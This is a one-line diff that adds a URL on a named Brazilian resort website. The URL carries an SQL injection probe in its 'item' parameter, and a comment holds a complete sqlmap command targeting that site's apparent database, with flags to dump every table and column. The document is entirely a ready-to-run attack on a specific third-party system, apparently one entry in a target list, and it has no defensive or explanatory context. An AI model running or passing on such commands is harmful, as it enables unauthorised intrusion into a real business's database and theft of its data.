@@ -1,0 +1,1 @@
+http://www.resortsbrasil.net.br/index.php?url=grand-oca-maragogi-resort&item=523+OrdEr+BY+1-- (GET)  # sqlmap.py -u http://www.resortsbrasil.net.br/index.php?url=grand-oca-maragogi-resort&item=523+OrdEr+BY+1-- -D resortsb_site --tables --columns --dump-all --threads 5 -v3 --stop=10
